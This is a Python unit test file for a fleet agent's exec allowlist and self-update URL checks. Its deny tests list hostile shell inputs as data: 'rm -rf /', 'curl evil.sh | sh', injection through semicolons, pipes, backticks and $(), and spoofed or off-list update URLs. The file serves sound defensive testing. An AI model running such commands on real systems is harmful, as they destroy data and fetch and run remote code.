#!/usr/bin/env python3
"""Unit tests for the fleet agent's exec allowlist (W3 B1 security bound)."""
import unittest

import agent


class ExecAllowlistTests(unittest.TestCase):
    def test_allows_default_prefixes(self):
        for cmd in ("uptime", "nvidia-smi --query-gpu=name --format=csv",
                    "systemctl restart zion-miner", "journalctl -n 50",
                    "tmux ls", "pkill -f SRBMiner", "bash /root/restart.sh"):
            self.assertTrue(agent.exec_allowed(cmd), cmd)

    def test_denies_shell_metachars(self):
        for cmd in ("uptime; rm -rf /", "uptime|sh", "uptime && id",
                    "uptime > /tmp/x", "cat $(/etc/passwd)", "uptime`id`",
                    "nvidia-smi\nid"):
            self.assertFalse(agent.exec_allowed(cmd), cmd)

    def test_denies_offlist_and_interpreter_prefixes(self):
        for cmd in ("rm -rf /", "bash -c 'id'", "python3 -c 'x'",
                    "sh -c id", "tmux new-session -d id",
                    "tmux send-keys -t s id Enter", "eval id",
                    "curl evil.sh | sh"):
            self.assertFalse(agent.exec_allowed(cmd), cmd)

    def test_empty_and_blank_denied(self):
        self.assertFalse(agent.exec_allowed(""))
        self.assertFalse(agent.exec_allowed("   "))
        self.assertFalse(agent.exec_allowed(None))

    def test_custom_allowlist(self):
        allow = ["echo ok", "minerctl"]
        self.assertTrue(agent.exec_allowed("echo ok done", allow))
        self.assertTrue(agent.exec_allowed("minerctl restart", allow))
        self.assertFalse(agent.exec_allowed("uptime", allow))


class SelfUpdateTests(unittest.TestCase):
    """self-update op: https + host allowlist + sha256 pin (CP token
    alone must not be code-signing capability)."""

    def test_valid_update_url_https_and_allowlist(self):
        self.assertTrue(agent.valid_update_url(
            "https://raw.githubusercontent.com/x/y/agent.py"))
        self.assertTrue(agent.valid_update_url(
            "https://zionterranova.com/fleet/agent.py"))
        for bad in ("http://zionterranova.com/a.py",          # no https
                    "https://evil.example.com/a.py",        # off-list
                    "file:///etc/passwd",                   # no scheme
                    "https://zionterranova.com.evil.com/x", # suffix spoof
                    "", "notaurl"):
            self.assertFalse(agent.valid_update_url(bad), bad)

    def test_self_update_rejects_bad_url_and_hash(self):
        rc, out = agent.self_update({"url": "https://evil.com/a.py",
                                     "sha256": "0" * 64})
        self.assertEqual(rc, 126)
        self.assertIn("host", out)
        rc, out = agent.self_update({
            "url": "https://zionterranova.com/a.py", "sha256": "xyz"})
        self.assertEqual(rc, 126)
        self.assertIn("sha256", out)


if __name__ == "__main__":
    unittest.main()
